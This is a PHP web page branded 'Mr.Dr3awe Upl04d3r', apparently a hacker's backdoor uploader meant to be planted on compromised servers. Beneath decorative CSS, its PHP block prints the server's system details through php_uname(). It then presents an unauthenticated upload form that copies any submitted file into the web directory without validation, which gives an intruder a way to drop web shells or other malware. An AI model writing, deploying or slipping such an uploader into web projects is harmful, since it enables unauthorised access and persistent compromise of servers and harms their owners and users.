<html>
<head>
<title>Mr.Dr3awe</title>
<meta http-equiv=Content-Type content=text/html; charset=utf-8 charset=UTF-8>
<style>
* {margin:0;padding:0}
html, body {
	margin: auto;
	padding: 0px;
	min-width: 960px;
	background: #161616 url(https://fbcdn-sphotos-d-a.akamaihd.net/hphotos-ak-xap1/v/t1.0-9/10686970_815004835199767_2832798233243574541_n.jpg?oh=0e5a1d41872e06e662cb2fcf9f8fc1aa&oe=54944767&__gda__=1422122683_7d48e581f3ce512bc63641ad7756b08b) repeat;
	color: #FFFFFF;
	text-shadow: 2px 0px 1px #000;
	font-family:"tahoma", Times, serif;
	font-style:bold;
	font-size: 10pt;
	text-align:center;
	min-height:468px;/* for good browsers*/
	min-width:552px;/* for good browsers*/
}

input, select, textarea ,button{
	outline: none;
	cursor: pointer;
	margin: 0px;
	opacity:1;
}
ol, ul, li, h1, h2, h3, h4 {
	margin: auto;
	padding: 0px;
	list-style: none;
	list-style-position: inside;
}
h5 { font-size: 25pt;
	 color:#FFFFFF;
	 }
h6 { font: regular 8pt;
	 font-family:tahoma;
	 color: #FFFFFF;
	 }
h2 { font: regular 22pt;
	 font-family:tahoma;
	 color: #FFFFFF;
	 }
img { border: none; }
input[type=text], textarea, select, input[type=password] ,button{
	border: 5px #0e0e0e solid;
	background: #000;
	color: #666;
	margin: auto;
	padding: auto;
	font-family: Tahoma;
	font-size: 12px;
	border-radius: 5px;
	-moz-border-radius:5px;
	-webkit-border-radius: 5px;
	-khtml-border-radius: 5px;
	opacity:0.7;
	filter:alpha(opacity=90); 
}
input[type=submit], .button, input[type=reset], button {
	background: #FFFFFF ;
	color: #000;
	font-family: Tahoma;
	font-size: 12px;
	margin: auto;
	opacity:1;
	filter:alpha(opacity=90); 
	padding: 5px 8px !important;
	border: none !important;
	border-radius: 5px;
	-moz-border-radius:5px;
	-webkit-border-radius: 5px;
	-khtml-border-radius: 5px;
}
</style>
<body>
</center>
<p><b>Mr.Dr3awe <span lang="ar-ma">|</span> Upl04d3r</b></p>

<?php
echo '<b><br><br>'.php_uname().'<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Uploaded Successfully</b><br><br>'; }
	else { echo '<b>Upload Failed! </b><br><br>'; }
}
?></p>
</body>
<!--
Mr.Dr3awe
-->
</html>